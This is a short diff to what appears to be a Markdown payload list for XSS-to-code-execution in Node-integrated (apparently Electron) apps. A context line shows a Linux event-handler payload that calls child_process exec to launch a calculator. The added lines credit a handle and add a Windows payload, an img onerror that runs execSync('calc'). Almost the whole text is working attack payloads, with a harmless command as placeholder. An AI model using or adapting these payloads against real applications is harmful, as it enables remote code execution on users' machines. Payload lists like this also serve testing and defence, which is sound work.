@@ -45,3 +45,11 @@ or for Linux
 <TagName EventHandler="require('child_process').exec('gnome-
 calculator');">
 ```
+
+#### Credit: @h4x0r_fr34k
+
+Windows Payload:
+
+```
+<img src=x onerror="alert(require('child_process').execSync('calc').toString());">
+```
